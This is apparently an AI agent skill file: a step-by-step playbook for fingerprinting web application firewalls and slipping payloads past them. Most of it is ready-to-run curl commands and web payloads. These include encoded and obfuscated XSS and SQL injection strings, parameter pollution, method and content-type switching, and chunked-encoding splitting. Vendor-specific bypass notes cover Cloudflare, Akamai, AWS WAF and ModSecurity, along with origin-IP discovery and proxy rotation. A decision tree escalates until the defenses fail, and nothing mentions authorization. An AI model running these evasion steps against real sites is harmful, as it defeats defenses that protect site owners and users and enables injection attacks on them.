---
name: waf_bypass
description: WAF detection, fingerprinting, and evasion techniques for payload delivery
---

# WAF Evasion Techniques

## Phase 1: WAF Detection & Fingerprinting

### Identify WAF Presence

```bash
# wafw00f — dedicated WAF fingerprinter
wafw00f <target-url>

# Manual detection: send a clearly malicious request
curl -sI "<target-url>/?id=<script>alert(1)</script>"
# Look for: 403/406 status, custom error pages, WAF headers

# Common WAF response headers
# X-Sucuri-ID          -> Sucuri
# cf-ray               -> Cloudflare
# x-amz-cf-id          -> AWS CloudFront
# x-akamai-transformed -> Akamai
# server: AkamaiGHost  -> Akamai
# x-cdn: Imperva       -> Imperva/Incapsula
```

### Confirm WAF Behavior

```bash
# Send baseline request (should pass)
curl -s -o /dev/null -w "%{http_code}" "<target-url>/page?q=hello"

# Send malicious request (should be blocked)
curl -s -o /dev/null -w "%{http_code}" "<target-url>/page?q=<script>alert(1)</script>"

# Compare responses: different status codes or body = WAF active
# Note the blocking threshold for calibration
```

## Phase 2: Encoding-Based Evasion

### URL Encoding (Single & Double)

```
# Original:        <script>alert(1)</script>
# URL encoded:     %3Cscript%3Ealert(1)%3C/script%3E
# Double encoded:  %253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### Unicode / UTF-8 Encoding

```
# Original:  <script>
# Unicode:   \u003cscript\u003e
# UTF-8 overlong: %C0%BC (represents <)
# Wide char:  ＜script＞ (fullwidth characters)
```

### Hex Encoding

```
# SQL injection evasion
# Original:  ' OR 1=1--
# Hex:       0x27204f5220313d312d2d
# In query:  ?id=0x27204f5220313d312d2d

# For MySQL:
SELECT * FROM users WHERE name = 0x61646d696e  -- "admin" in hex
```

### HTML Entity Encoding (for XSS)

```
# Original:  <img src=x onerror=alert(1)>
# Decimal:   &#60;img src=x onerror=alert(1)&#62;
# Hex:       &#x3c;img src=x onerror=alert(1)&#x3e;
# Named:     &lt;img src=x onerror=alert(1)&gt;
```

## Phase 3: Payload Obfuscation

### SQL Injection Bypass

```sql
-- Case manipulation
SeLeCt * FrOm users

-- Comment insertion
SEL/**/ECT * FR/**/OM users

-- Whitespace alternatives
SELECT\t*\tFROM\tusers
SELECT%0a*%0aFROM%0ausers

-- Function alternatives
CONCAT('a','d','m','i','n') instead of 'admin'
CHAR(97,100,109,105,110) instead of 'admin'

-- Operator alternatives
1 /*!50000OR*/ 1=1    -- MySQL version-specific comment
1 || 1=1              -- OR alternative
1 && 1=1              -- AND alternative
```

### XSS Payload Bypass

```html
<!-- Event handler variations -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>

<!-- JavaScript protocol -->
<a href="javascript:alert(1)">click</a>
<a href="jav&#x09;ascript:alert(1)">click</a>

<!-- Template literals (backticks) -->
<script>alert`1`</script>

<!-- No parentheses -->
<script>onerror=alert;throw 1</script>
<script>alert?.({toString:()=>'1'})</script>
```

## Phase 4: HTTP-Level Evasion

### HTTP Parameter Pollution (HPP)

```bash
# Send duplicate parameters — different servers handle differently
# Apache: takes last value
# IIS/ASP: concatenates values
# PHP: takes last value

curl "<target-url>/search?q=safe&q=<script>alert(1)</script>"
# WAF may only inspect first parameter value
```

### Method Switching

```bash
# Original blocked GET request
curl "<target-url>/api/users?id=1 OR 1=1"

# Try as POST
curl -X POST "<target-url>/api/users" -d "id=1 OR 1=1"

# Try with method override headers
curl -X POST "<target-url>/api/users?id=1 OR 1=1" -H "X-HTTP-Method-Override: GET"
curl -X POST "<target-url>/api/users" -H "X-HTTP-Method: PUT" -d "id=1 OR 1=1"
```

### Content-Type Switching

```bash
# Standard form submission (commonly inspected by WAF)
curl -X POST <target-url>/api -H "Content-Type: application/x-www-form-urlencoded" -d "param=<payload>"

# Switch to JSON (may bypass WAF rules written for form data)
curl -X POST <target-url>/api -H "Content-Type: application/json" -d '{"param":"<payload>"}'

# Switch to XML
curl -X POST <target-url>/api -H "Content-Type: application/xml" -d '<root><param><payload></param></root>'

# Multipart (WAF often skips deep inspection of multipart bodies)
curl -X POST <target-url>/api -F "param=<payload>"
```

### Chunked Transfer Encoding

```bash
# Split payload across HTTP chunks — WAF may not reassemble before inspection
curl -X POST <target-url>/api \
  -H "Transfer-Encoding: chunked" \
  -d $'4\r\n<scr\r\n6\r\nipt>al\r\n9\r\nert(1)</s\r\n7\r\ncript>\r\n0\r\n\r\n'
```

## Phase 5: WAF-Specific Bypass Reference

```
CLOUDFLARE
  - Try: Unicode normalization bypasses, chunked encoding
  - Blocked headers: X-Forwarded-For spoofing ineffective (real IP via cf-connecting-ip)
  - Bypass vector: origin IP discovery via DNS history, Censys, Shodan

AKAMAI
  - Try: HPP, content-type switching, double URL encoding
  - Known strict on SQLi/XSS, weaker on SSRF payloads

AWS WAF
  - Try: JSON body payloads, case manipulation, comment injection
  - Rate limiting often on IP — rotate with proxy pool

MOD_SECURITY (OWASP CRS)
  - Paranoia level matters: level 1 = easy bypass, level 4 = very strict
  - Try: comment insertion in SQL, event handler variations for XSS
  - Anomaly scoring: stay below threshold with minimal payload
```

## Decision Tree

```
1. Is a WAF present?
   YES -> Fingerprint it, note blocking behavior
   NO  -> Proceed with standard payloads

2. What is blocked?
   KEYWORDS (select, script) -> Use encoding/case tricks
   PATTERNS (regex-based)    -> Use comment insertion, whitespace
   SIGNATURES (known payloads) -> Use novel payload constructions

3. Encoding bypasses work?
   YES -> Use the working encoding consistently
   NO  -> Escalate to HTTP-level evasion (HPP, chunked, method switch)

4. All evasion fails?
   -> Try origin IP discovery to bypass WAF entirely
   -> Look for alternative endpoints not behind WAF
```
